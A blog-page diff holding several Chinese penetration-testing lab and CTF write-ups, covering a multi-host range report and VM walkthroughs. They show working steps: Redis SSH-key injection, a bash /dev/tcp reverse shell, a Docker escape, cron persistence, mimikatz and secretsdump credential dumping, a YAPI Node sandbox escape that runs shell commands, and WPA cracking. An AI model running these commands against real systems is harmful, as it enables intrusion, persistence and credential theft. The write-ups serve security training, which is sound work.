@@ -33,15 +33,382 @@
             <div class="card-content">
                 <h3 class="menu-label">Hot Recommend</h3><span id="index_hot_div">Loading...Wait a Minute!</span>
             </div>
-        </div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-30  <a class="commentCountImg" href="/2026/03/30/ok/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>fast  <i class="fas fa-pencil-alt"> </i>0.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/30/ok/"> </a></h1><div class="content"><p>qqqq</p>
-</div><div class="index-category-tag">  <hr></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png" alt="辣椒の酱"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">辣椒の酱</p><p class="is-size-6 is-block">尚未执佩剑，转眼即江湖</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>阿尔及利亚</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Post</p><a href="/archives/"><p class="title">1</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories/"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags/"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/removeif"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/removeif"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:removeif@163.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Next" href="https://removeif.github.io/remove.io"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
+        </div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-31  <a class="commentCountImg" href="/2026/03/31/%E7%BA%A2%E6%97%A5/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>13 m  <i class="fas fa-pencil-alt"> </i>2.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/31/%E7%BA%A2%E6%97%A5/"> </a></h1><div class="content"><p>​			<img src="file:///C:\Users\唐旭\AppData\Local\Temp\ksohtml40936\wps9.png" alt="img"><img src="file:///C:\Users\唐旭\AppData\Local\Temp\ksohtml40936\wps10.png" alt="img"></p>
+<p>​									自动化网络渗透测试</p>
+<p>​										项目实施报告</p>
+<p>​							题目： 综合网络靶场渗透测试   </p>
+<p>​							学院： 计算机与人工智能学院（软件学院）</p>
+<p>​							专业：     网络空间安全      </p>
+<p>​							班级：      2023级 5  班     </p>
+<p>​							姓名：    唐旭、谭卓元        </p>
+<p>​							时间：     2026年1月6日    </p>
+<p>信息收集<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206092221259.png" alt="image-20251206092221259"></p>
+<p>端口扫描<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206092249562.png" alt="image-20251206092249562"><br>用fscan 漏扫发现redis未授权跟CVE漏洞，一个个尝试</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206093049687.png" alt="image-20251206093049687"></p>
+<p>kali利用redis-cli工具连接<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206093301835.png" alt="image-20251206093301835"></p>
+<p>有了未授权，我们直接往目标主机写入ssh公钥,将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的redis缓冲里.<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206093740771.png" alt="image-20251206093740771"></p>
+<p>然后使用攻击机连接目标机器Redis，分别执行如下命令将ssh公钥写入目标主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys</span><br><span class="line">save    # 将数据保存在目标服务器硬盘上</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206093939490.png" alt="image-20251206093939490"></p>
+<p>接着我们开始测试连接目标靶机ssh<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206094434249.png" alt="image-20251206094434249"></p>
+<p>连接成功。<br>当查看ip时发现还有一层内网。<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206094602700.png" alt="image-20251206094602700"></p>
+<p>给靶机传输fscan来对192.168.52.10的网段进行信息收集。<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206095527601.png" alt="image-20251206095527601"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206095537662.png" alt="image-20251206095537662"></p>
+<p>给权限之后开始扫描，成功发现一个ip192.168.52.20</p>
+<p>接下来我们对81端口进行访问192.168.150.138:81<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251206100338067.png" alt="image-20251206100338067"></p>
+<p>发现是个Laravel的站点，这个版本为Laravel v8.29.0 (PHP v7.4.14)，Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构</p>
+<p>这个版本存在远程代码执行漏洞，我们可以通过exp打，也可以使用工具，直接生成shell进行连接</p>
+<p>我们直接用cve漏洞打<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251207143447489.png" alt="image-20251207143447489"></p>
+<p>成功写入木马<br>蚁剑连接</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251207143657395.png" alt="image-20251207143657395"></p>
+<p>成功连接以后发现是一个docker容器<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251207144300124.png" alt="image-20251207144300124"></p>
+<p>想要逃逸docker需要一个稳定的shell,我们开始从蚁剑中反弹shell到web1主机上</p>
+<p>将bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.52.10&#x2F;8899 0&gt;&amp;1”写入1.sh，web1开启监听，蚁剑bash 1.sh就可以反弹shell了。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230103806665.png" alt="image-20251230103806665"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230103919842.png" alt="image-20251230103919842"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230103935489.png" alt="image-20251230103935489"></p>
+<p>此时我们拿到的权限仅仅只是www-data，这个用户权限较低，需要提权到root权限</p>
+<p>我们先稳定shell到kali里面，利用环境变量劫持提权，先写入一个bash文件如下，在给权限</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230110122831.png" alt="image-20251230110122831"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230105904910.png" alt="image-20251230105904910"></p>
+<p>将tmp放在最前面然后再重kali开启一个新的终端，ssh连接web1，开启监听用8889端口，最后执行一下&#x2F;home&#x2F;jobs&#x2F;shell文件就可以提权到root权限</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230110332427.png" alt="image-20251230110332427"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230110413460.png" alt="image-20251230110413460"></p>
+<p>但现在还是docker里面的root权限现在要逃逸docker，需要将web2的文件内容挂载到docker里面，就相当于逃离了docker，即使还在docker，但是能执行web2的文件。</p>
+<p>我们先在docker中新建一个 &#x2F;hack 目录用来挂载文件系统： mkdir &#x2F;hack ,再挂载到宿主机第一块硬盘</p>
+<p>mount &#x2F;dev&#x2F;sda1 &#x2F;hack<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230111135521.png" alt="image-20251230111135521"></p>
+<p>hack文件夹里有东西了，挂载成功<br>接下来就是内网渗透使用工具stowaway搭建隧道。</p>
+<p>用http服务上传stowaway压缩包到web1<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230234104825.png" alt="image-20251230234104825"></p>
+<p>然后卡里开启监听（.&#x2F;admin  -l  9999  -s  hack ），web1连接就好了<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230234136970.png" alt="image-20251230234136970"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230234332913.png" alt="image-20251230234332913"></p>
+<p>连接web1成功。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251230234425584.png" alt="image-20251230234425584"></p>
+<p>web1运行agent连接上kaili监听的9999端口后，提示上线成功，对应节点0（node 0）在node 0节点模式使用命令 socks 1080 打开代理端口，kali上数据往1080端口发的，都会被代理到web1的</p>
+<p>192.168.150.138主机上<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120083413255.png" alt="image-20260120083413255"></p>
+<p>再给firefox设置代理就可访问web2的服务了<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120083907629.png" alt="image-20260120083907629"><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120083930339.png" alt="image-20260120083930339"></p>
+<p>但是curl没反应，这时候我们要修改proxychains配置文件，添加最后一句话就好了。<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120084620384.png" alt="image-20260120084620384"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120084246076.png" alt="image-20260120084246076"></p>
+<p>成功响应。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120084600499.png" alt="image-20260120084600499"></p>
+<p>接下来就是将web2的代理也用搭建连接将agent传到web2中的hack&#x2F;tmp挂载中。</p>
+<p>先上传到www-data用户上在复制到挂载中在赋予权限。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120085128905.png" alt="image-20260120085128905"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120085311924.png" alt="image-20260120085311924"></p>
+<p>再添加定时任务（echo ‘* * * * * &#x2F;agent -c 192.168.52.10:8881 -s hack &amp;’ &gt; &#x2F;hack&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root）（cat &#x2F;hack&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root）</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120085514694.png" alt="image-20260120085514694"></p>
+<p>上线成功拿到web2的shell，再将端口转发到kali上 </p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120095320123.png" alt="image-20260120095320123"></p>
+<p>发现存在192.168.52.30：8888主机服务，firefox设置代理访问</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120120632536.png" alt="image-20260120120632536"></p>
+<p>看到标题为通达OA，联想到通达OA漏洞</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120120757356.png" alt="image-20260120120757356"></p>
+<p>Kali的jDK版本切换为jdk1.8.0，然后运行通达OA渗透工具，在工具内设置代理后（socks:&#x2F;&#x2F;127.0.0.1:1080)进行文件上传</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120120900734.png" alt="image-20260120120900734"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120120908519.png" alt="image-20260120120908519"></p>
+<p>再打开一个蚁剑，因为要加代理</p>
+<p><img src="file:///C:\Users\唐旭\AppData\Local\Temp\ksohtml40936\wps1.jpg" alt="img"> </p>
+<p>复制文件上传成功后的那个地址，添加地址，测试连接可以成功。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120120955383.png" alt="image-20260120120955383"></p>
+<p>得到目标windows主机（PC1）的 SYSTEM权限，然后上线PC1</p>
+<p><img src="file:///C:\Users\唐旭\AppData\Local\Temp\ksohtml40936\wps3.jpg" alt="img"> </p>
+<p>利用WINPEAS工具进行信息收集下载 win_info.txt 到kali进行分析。其中发现提示可以导出明文密码。</p>
+<p><img src="file:///C:\Users\唐旭\AppData\Local\Temp\ksohtml40936\wps4.jpg" alt="img"> </p>
+<p>从工具包mimikatz_trunk.zip中找到64位的mimikatz.exe </p>
+<p>上传，执行下列指令获取明文密码</p>
+<p>mimikatz.exe”logres.txt””privilege::debug””sekurlsa::logonpasswords””exit”，执行完会在当前目录生成res.txt文件，蚁剑中双击打开这个文件。里面能看到密码Bunny2021。</p>
+<p><img src="file:///C:\Users\唐旭\AppData\Local\Temp\ksohtml40936\wps5.jpg" alt="img"> </p>
+<p>利用fscan工具对93网段进行信息收集</p>
+<p><img src="file:///C:\Users\唐旭\AppData\Local\Temp\ksohtml40936\wps6.jpg" alt="img"> </p>
+<p>上线节点3</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120121046649.png" alt="image-20260120121046649"></p>
+<p>在PC1的shell中上传执行工具包中的secretsdump.exe，能从域控中获取所有用户的用户密码hash值</p>
+<p>secretsdump.exewhoamianony.org&#x2F;administrator:<a href="mailto:&#x57;&#104;&#x6f;&#97;&#109;&#x69;&#50;&#x30;&#50;&#49;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#57;&#51;&#46;&#x33;&#48;&#45;&#106;&#117;&#115;&#116;&#x2d;&#100;&#99;">Whoami2021@192.168.93.30-just-dc</a></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260120121107800.png" alt="image-20260120121107800"></p>
+</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-31  <a class="commentCountImg" href="/2026/03/31/Victim01_042220/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 m  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/31/Victim01_042220/"> </a></h1><div class="content"><h1 id="Victim01-042220"><a href="#Victim01-042220" class="headerlink" title="Victim01_042220"></a>Victim01_042220</h1><p>1.信息收集   主机嗅探、端口扫描、<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923160717256.png" alt="image-20250923160717256"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923161222664.png" alt="image-20250923161222664"></p>
+<p>2.查看网站没发现重要信息，直到看到8999端口里面有许多文件，找到一个流量包文件，将文件下载出来。<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923161652601.png" alt="image-20250923161652601"></p>
+<p>3.kali  wireshark打开文件<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923162028835.png" alt="image-20250923162028835"></p>
+<p>发现了一个<code>WPA-01</code>数据包保存下载进行分析 发现协议是<code>802.11</code>(无线网协议) 找<code>SSID</code>每个无线网都有自己的</p>
+<p>4.密码爆破<br><strong>使用工具 <code>aircrack-ng</code>进行<code>WIFI</code>破解 得到密码：<code>p4ssword</code></strong></p>
+<p>aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt WPA-01.cap  </p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923163005292.png" alt="image-20250923163005292"></p>
+<ol start="5">
+<li><p>ssh连接靶机</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923163105852.png" alt="image-20250923163105852"></p>
+</li>
+<li><p>查找拥有root权限的文件<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923163356801.png" alt="image-20250923163356801"></p>
+</li>
+<li><p>在网站上查找nohup的用法。直接执行即可拿到root权限。</p>
+</li>
+</ol>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923163517293.png" alt="image-20250923163517293"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923163652524.png" alt="image-20250923163652524"></p>
+<ol start="8">
+<li><p>拿到flag.</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923163711829.png" alt="image-20250923163711829"></p>
+</li>
+</ol>
+</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-31  <a class="commentCountImg" href="/2026/03/31/Untitled/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 m  <i class="fas fa-pencil-alt"> </i>0.2 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/31/Untitled/"> </a></h1><div class="content"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​                                               yapi<br>1.打开靶机发现是yapi框架，发现登录界面，在网上搜索默认账号密码<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260207143439811.png" alt="image-20260207143439811"></p>
+<p>可以登录成功</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260207143612991.png" alt="image-20260207143612991"></p>
+<p>点击添加项目<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260207143637097.png" alt="image-20260207143637097"></p>
+<p>添加接口<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260207143708681.png" alt="image-20260207143708681"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260207143732397.png" alt="image-20260207143732397"></p>
+<p>点开接口后发现可以预览<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260207143858544.png" alt="image-20260207143858544"></p>
+<p>点到高级Mock发现可以添加脚本</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260207143947424.png" alt="image-20260207143947424"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const sandbox = this  </span><br><span class="line">const ObjectConstructor = this.constructor  </span><br><span class="line">const FunctionConstructor = ObjectConstructor.constructor  </span><br><span class="line">const myfun = FunctionConstructor(&#x27;return process&#x27;)  </span><br><span class="line">const process = myfun()  </span><br><span class="line">mockJson = process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /root/flag.txt&quot;).toString()</span><br></pre></td></tr></table></figure>
+
+<p>把这段脚本添加进去就能预览到flag了（记得点保存）。<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20260207144118666.png" alt="image-20260207144118666"></p>
+</div><div class="index-category-tag">  <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-31  <a class="commentCountImg" href="/2026/03/31/p4l4nc4/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>4 m  <i class="fas fa-pencil-alt"> </i>0.7 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/31/p4l4nc4/"> </a></h1><div class="content"><h1 id="P4l4nc4"><a href="#P4l4nc4" class="headerlink" title="P4l4nc4"></a>P4l4nc4</h1><ol>
+<li><p>嗅探存活<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126183341390.png" alt="image-20251126183341390"></p>
+</li>
+<li><p>端口扫描<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126183443567.png" alt="image-20251126183443567"></p>
+</li>
+<li><p>在网页上没看到什么有用的信息，扫描网页目录</p>
+</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126183533276.png" alt="image-20251126183533276"></p>
+<ol start="4">
+<li>直接请求响应<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126183610369.png" alt="image-20251126183610369"></li>
+</ol>
+<p>​     将内容写进tmp</p>
+<p>​	将tmp进行整理写入tmp1</p>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126183854893.png" alt="image-20251126183854893"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126184010904.png" alt="image-20251126184010904"></p>
+<p>根据B站大傻子的视频写的wp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://space.bilibili.com/20805349?spm_id_from=333.788.upinfo.head.click</span><br></pre></td></tr></table></figure>
+
+<p>将tmp1里的数据进行下面的替换，分别是用4替换a，用3替换e，用1替换i跟l，写入a.txt</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126184351958.png" alt="image-20251126184351958"></p>
+<p>将a.txt的内容的大写变小写写入b.txt<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126184659715.png" alt="image-20251126184659715"></p>
+<ol start="5">
+<li><p>用gobuster扫描网站目录</p>
+<p>发现n3gr4打开网页啥也没有，继续扫二级目录</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126184813720.png" alt="image-20251126184813720"></p>
+<p>这才扫到m414nj3.php到这还没结束，还需要用wfuzz爆破api</p>
+</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126184902929.png" alt="image-20251126184902929"></p>
+<p>爆破到page</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126185031863.png" alt="image-20251126185031863"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126185120739.png" alt="image-20251126185120739"></p>
+<ol start="6">
+<li>查看源代码发现存在p414nc4用户<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126185223493.png" alt="image-20251126185223493"></li>
+</ol>
+<p>​         尝试能否直接读取文件内容，成功拿到user.txt<br>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126185337029.png" alt="image-20251126185337029"></p>
+<ol start="7">
+<li>接着查看ssh秘钥<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126185542917.png" alt="image-20251126185542917"></li>
+</ol>
+<p>​	复制到kali上用john破解密码（注意复制的时候需要在源代码上复制否者格式错误，ssh2john不能解析）</p>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126190328968.png" alt="image-20251126190328968"></p>
+<p>​	我这里以经用john破解过了直接-show展示即可拿到密码friendster<br>​	ssh连接<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126190511202.png" alt="image-20251126190511202"></p>
+<ol start="8">
+<li>查看bash_history文件</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126190619011.png" alt="image-20251126190619011"></p>
+<p>​	发现&#x2F;etc&#x2F;passwd文件给了权限，就可以直接添加root用户</p>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126190740567.png" alt="image-20251126190740567"></p>
+<p>​	先用openssl加密明文密码111111</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126190834318.png" alt="image-20251126190834318"></p>
+<p>​	然后构造payload<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126191238355.png" alt="image-20251126191238355"></p>
+<p>​	添加成功<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126191308819.png" alt="image-20251126191308819"></p>
+<p>​	切换用户就能拿到root.txt<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251126191401427.png" alt="image-20251126191401427"></p>
+</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-31  <a class="commentCountImg" href="/2026/03/31/opacity/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>5 m  <i class="fas fa-pencil-alt"> </i>0.8 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/31/opacity/"> </a></h1><div class="content"><h1 id="hackvm-opacity"><a href="#hackvm-opacity" class="headerlink" title="hackvm        opacity"></a>hackvm        opacity</h1><ol>
+<li><p>主机嗅探<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106184737104.png" alt="image-20251106184737104"></p>
+</li>
+<li><p>端口扫描<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106184816398.png" alt="image-20251106184816398"></p>
+</li>
+<li><p>网站是一个登录页面，尝试x-forwarded-for，sql注入，爆破都没有找到漏洞，dirsearch扫描网站后台扫到&#x2F;cloud</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.114 -e*</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106185313100.png" alt="image-20251106185313100"></p>
+</li>
+</ol>
+<p>​	4. 是一个文件上传网站上面提示输入URL，就想到kali开启http服务上传</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106185831915.png" alt="image-20251106185831915"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106190057543.png" alt="image-20251106190057543"></p>
+<p>​	先上传一个正常的图片文件，上传成功并且带有文件路径<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106190604420.png" alt="image-20251106190604420"></p>
+<p>​	尝试上传木马文件，发现只需要在php文件后加空格.jpg就能成功绕过验证上传php文件。</p>
+<p>上传成功kali带有提示</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106191007412.png" alt="image-20251106191007412"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106191028103.png" alt="image-20251106191028103"></p>
+<p>​	可以访问文件，接着kali开启监听拿shell</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106191211984.png" alt="image-20251106191211984"></p>
+<p>​	刷新一下网站即可反弹shell<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106191359198.png" alt="image-20251106191359198"></p>
+<p>​	在home文件夹下发现用户sysadmin。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106191604834.png" alt="image-20251106191604834"></p>
+<ol start="5">
